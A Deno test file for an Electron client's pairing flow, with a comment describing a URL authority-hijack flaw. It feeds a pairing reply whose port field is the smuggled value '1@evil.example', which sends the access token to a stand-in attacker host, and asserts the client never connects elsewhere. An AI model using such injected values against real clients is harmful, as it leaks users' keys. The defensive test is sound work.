// aio-client `pairWith`: the pairing REPLY's `port` goes into the reconnect
// URL unvalidated. A .aioapp profile is checked (loadProfileFile: integer
// 1..65535, "a .aioapp is an untrusted file") — the pairing reply comes from
// whatever LAN host answered discovery, i.e. equally untrusted, yet
// `port: "1@evil.example"` makes the saved + connected URL
// `http://<lan-host>:1@evil.example/?token=<key>` — authority hijacked to
// another host, with the key riding along and the recent pinned under the
// LAN host's name.
import { assertEquals } from "@std/assert";
import { electronClientScript } from "../src/electron/electron-client-script.ts";

function extractFn(src: string, header: string): string {
  const start = src.indexOf(header);
  if (start < 0) throw new Error(`not found: ${header}`);
  const end = src.indexOf("\n}\n", start);
  return src.slice(start, end + 2);
}

Deno.test("aio-client: a pairing reply with a non-numeric port never reaches the connect URL", async () => {
  const src = electronClientScript(null);
  const body = extractFn(src, "async function pairWith(win, info) {") +
    extractFn(src, "function profileToRecent(pr) {");
  const connected: string[] = [];
  const saved: { url: string }[] = [];
  const make = new Function(
    "postJson",
    "pinCert",
    "saveRecent",
    "connectTo",
    `${body}\nreturn pairWith;`,
  );
  const pairWith = make(
    () =>
      Promise.resolve({
        status: 200,
        json: { aio: 1, key: "KEY", port: "1@evil.example" },
      }),
    () => {},
    (r: { url: string }) => saved.push(r),
    (_w: unknown, url: string) => connected.push(url),
  ) as (win: unknown, info: unknown) => Promise<void>;
  const win = { webContents: { executeJavaScript: () => Promise.resolve() } };
  await pairWith(win, { host: "192.168.1.5", port: 8000, pin: "123456" });

  // Either refused outright, or connected to the host the user picked.
  const elsewhere = [...connected, ...saved.map((r) => r.url)].filter((u) =>
    new URL(u).hostname !== "192.168.1.5"
  );
  assertEquals(elsewhere, [], "reply redirected the client to another host");
});
